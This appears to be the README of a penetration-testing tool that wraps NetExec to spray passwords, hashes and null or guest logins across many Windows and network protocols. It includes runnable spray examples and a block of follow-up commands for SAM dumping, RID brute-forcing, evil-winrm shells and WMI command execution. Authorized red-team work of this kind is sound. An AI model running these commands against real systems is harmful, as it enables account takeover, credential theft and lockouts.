# nxcblast

Spray credentials across every NetExec protocol at once -- hits only, lockout-aware, pastables on finish.

`nxcblast` is a thin Python wrapper around [`nxc`](https://github.com/Pennyw0rth/NetExec). It does **not** reimplement SMB, WinRM, RDP, or any other protocol; every auth attempt is a real `nxc` subprocess. Console output is signal, not noise: you see hits (with nxc-style access-level colors), a column header, and a live progress bar. Full verbose `nxc` output lands in a log file. When the spray finishes, you get a **Pastables** block -- ready-to-run follow-up commands grouped per protocol for each confirmed hit -- that you execute yourself.

Inspired by [nxcspray](https://github.com/NTHSec/nxcspray) by NTHSec. `nxcspray` proved the "one command, every protocol" workflow; `nxcblast` takes that idea and adds hits-only output, lockout awareness, `nxcdb` reuse, hash/null/guest auth, and pastable follow-ups.

## Install

`nxc` must already be on your `PATH` ([NetExec](https://github.com/Pennyw0rth/NetExec)). `nxcblast` is a single stdlib Python script -- no pip, no venv.

```bash
# wget
sudo wget -q https://raw.githubusercontent.com/brandonwhitmire/nxcblast/main/nxcblast.py -O /usr/local/bin/nxcblast && sudo chmod +x /usr/local/bin/nxcblast

# curl alternative
sudo curl -fsSL https://raw.githubusercontent.com/brandonwhitmire/nxcblast/main/nxcblast.py -o /usr/local/bin/nxcblast && sudo chmod +x /usr/local/bin/nxcblast
```

Or run it from the repo:

```bash
python3 nxcblast.py -h
```

## Usage

```
nxcblast [protocols] [targets] [auth] [options]
```

**Protocols** (positional or `--protocols`): `smb`, `winrm`, `rdp`, `ssh`, `ftp`, `ldap`, `mssql`, `vnc`, `wmi`. Use `all` or omit them to hit every protocol. Space-separated, comma-separated, or mixed.

**Targets**: one or more hosts, like `nxc` -- space-separated, comma-separated, mixed, a file of IPs/ranges (comments and blank lines ignored), a CIDR, or an nxc-style range (`192.168.1.10-20`).

`nxcblast` refuses to start without an explicit target. If you pass `-u`/`-U` with no password or hash, it defaults to `--user-only`. If you pass neither user nor password, it defaults to `--null`, `--null-user`, and `--guest`.

### Password spray

```bash
nxcblast smb,winrm targets.txt -u admin -p Password1
nxcblast smb rdp 10.10.10.5 -u admin -p 'Password1'
nxcblast 192.168.1.10 192.168.1.11 -u admin -p Password1
nxcblast 192.168.1.10,192.168.1.11 -u admin -p Password1
nxcblast targets.txt -u admin -p Password1          # no protocols = all
nxcblast all 192.168.1.0/24 -u admin -p Password1
nxcblast --protocols smb,ldap targets.txt -u admin -p Password1
```

### User / password lists (cartesian)

```bash
nxcblast smb targets.txt -U users.txt -P passwords.txt
nxcblast smb targets.txt -u admin -P passwords.txt
nxcblast smb targets.txt -U users.txt -p 'Summer2026!'
```

### Pass-the-hash

SSH is skipped automatically when the cred is hash-only.

```bash
nxcblast smb,wmi,winrm targets.txt -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
nxcblast smb 10.10.10.5 -U users.txt -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

### Creds file (`user:pass` or `user::hash`)

```
admin:Password1
DOMAIN\backup:Backup!23
administrator::aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
svc_sql:deadbeefdeadbeefdeadbeefdeadbeef:11223344556677889900aabbccddeeff
```

```bash
nxcblast smb,winrm targets.txt --creds creds.txt
```

### Null, guest, user-only, local (additive -- combine freely)

```bash
nxcblast smb 192.168.1.5                    # no user/pass: null + guest
nxcblast smb 192.168.1.5 -u admin           # no password: user-only (admin:'')
nxcblast smb 192.168.1.0/24 --null
nxcblast smb targets.txt --null --guest
nxcblast smb targets.txt -u admin --user-only
nxcblast smb,winrm targets.txt -u admin -p Password1 --local
nxcblast all targets.txt --null --guest --null-user -u admin --user-only
```

| Flag | What `nxc` receives |
|---|---|
| `--null` / `--null-user` | `-u '' -p ''` |
| `--guest` | `-u guest -p ''` |
| `--user-only` | `-u <USER> -p ''` (needs `-u`/`-U`; implied when `-u`/`-U` has no secret) |
| `--local` | `--local-auth` on smb/winrm/wmi/rdp (also tried automatically for null/guest/user-only) |

### MSSQL auth variants

When `mssql` is in the protocol list and you pass **no** mssql-specific flag, nxcblast runs all three: Windows auth, local SQL auth, and an internal `sa` attempt.

```bash
nxcblast mssql 10.10.10.20 -u sa -p sa                 # all 3 modes
nxcblast mssql 10.10.10.20 -u bob -p 'Password1' --mssql-windows
nxcblast mssql 10.10.10.20 -u sa -p sa --mssql-local
nxcblast mssql 10.10.10.20 -p 'Password1' -u bob --mssql-internal
nxcblast mssql targets.txt -u bob -p 'Password1' --mssql-windows --mssql-local
```

### nxcdb (reuse loot you already proved)

```bash
nxcblast smb,winrm targets.txt --nxcdb
nxcblast all targets.txt --nxcdb -u admin -p Password1   # db creds + CLI creds
```

### Lockout, pacing, threads

```bash
nxcblast smb targets.txt -U users.txt -p 'Winter2026!' --lockout 3 --lockout-delay 60
nxcblast smb targets.txt -u admin -p Password1 --lockout 0          # disable pause
nxcblast all targets.txt --creds creds.txt --delay 1 --threads 3
nxcblast smb targets.txt -u admin -p Password1 --stop-on-hit
```

### Output

```bash
nxcblast smb targets.txt -u admin -p Password1 --log spray.log
nxcblast smb targets.txt -u admin -p Password1 --no-log
nxcblast smb targets.txt -u admin -p Password1 --json hits.json
nxcblast smb targets.txt -u admin -p Password1 --quiet
```

## Console output

Hits only. Failures, banners, and nxc chatter stay in the log.

```
[*] nxcblast | protocols: smb,winrm,rdp,ssh,ftp,ldap,mssql,vnc,wmi | targets: 1 | creds: 1
[*] Verbose log: nxcblast_20260902_224305.log
[*] Ctrl+C skips this target during a pause; Ctrl+C otherwise stops the spray

    PROTO  | TARGET           | CREDS                  | ACCESS

[+] SMB    | 192.168.59.203   | jason:lab              | (valid)
[+] RDP    | 192.168.59.203   | jason:lab              | (Pwn3d!) RDP code exec
[+] WMI    | 192.168.59.203   | jason:lab              | (valid)

[*] Done. 3 hits across 1 target.
```

`(valid)` is green. `(Pwn3d!)` is bright red, with a short protocol-specific meaning (local admin, remote shell, sysadmin role, and so on). FTP never shows `Pwn3d!`. Lockout pauses are silent on the console (logged only).

Hit detection reads `nxc` stdout (exit codes are ignored): `[+]`, `Pwn3d!`, `STATUS_SUCCESS`, `(Shell)`. Lines with `STATUS_LOGON_FAILURE`, `STATUS_ACCESS_DENIED`, or `[-]` are dropped.

## Pastables

`nxcblast` never auto-runs enum or dump modules. At the end of every run it prints paste-ready follow-up commands for each confirmed hit, adapted to protocol and whether the secret is a password or an NTLM hash.

```
============================================================
PASTABLES -- confirmed hits, suggested follow-up commands
============================================================

[192.168.59.203 | jason:lab]

[SMB]
  nxc smb 192.168.59.203 -u jason -p 'lab' --shares
  nxc smb 192.168.59.203 -u jason -p 'lab' --rid-brute
  nxc smb 192.168.59.203 -u jason -p 'lab' --sam
  nxc smb 192.168.59.203 -u jason -p 'lab' --local-auth --shares

[WINRM]
  evil-winrm -i 192.168.59.203 -u jason -p 'lab'

[RDP]
  xfreerdp /u:jason /p:'lab' /v:192.168.59.203 /cert:ignore

[WMI]
  nxc wmi 192.168.59.203 -u jason -p 'lab' -x whoami
============================================================
```

Commands are grouped by protocol and only included for protocols that actually hit. If there are no confirmed hits, the Pastables block is omitted.

You run these. The tool does not.

## nxcdb workflow

NetExec already records every confirmed credential in the current workspace (`~/.nxc/workspaces/<workspace>/`). `nxcblast --nxcdb` reads that database -- protocol `.db` files plus `nxc.db` if present -- and queues plaintext and hash creds that are tied to a confirmed host (`loggedin_relations`, `admin_relations`, or pillaged-from).

The current workspace is taken from `~/.nxc/nxc.conf` (or `NXC_PATH` if you relocated NetExec's home). Before the spray starts, nxcblast prints how many db creds were loaded. Combine `--nxcdb` with `-u/-p/-H/--creds` to spray loot **and** new guesses in one pass.

## Lockout awareness

This is a **soft guard**, not a password-policy oracle.

- Unique credentials are counted per `(target, domain)`. The same password across SMB, WinRM, RDP, etc. counts as one attempt.
- At `--lockout N` (default 3 unique creds), nxcblast pauses `--lockout-delay S` seconds (default 60). The pause is silent on the console; the Ctrl+C hint is printed once at the top.
- Ctrl+C **during the pause** skips the rest of that target and continues the spray.
- Ctrl+C **any other time** stops the run and still prints Pastables for hits already found.
- `--lockout 0` disables the pause.

You own lockout policy. Check `--pass-pol` / domain policy yourself, size `--lockout` and `--lockout-delay` to the observation window, and do not assume this feature will save an account. nxcblast cannot see DC lockout thresholds, cached counters, or per-user exceptions.

## Guardrails

- Never auto-runs enum modules -- pastables only.
- Never implements protocol logic -- always delegates to `nxc`.
- Refuses to run without an explicit target. Missing passwords fall back to user-only / null / guest rather than erroring.
- Verifies `nxc` is on `PATH` at startup and exits clearly if it is not.
- stdlib only -- no third-party Python dependencies.
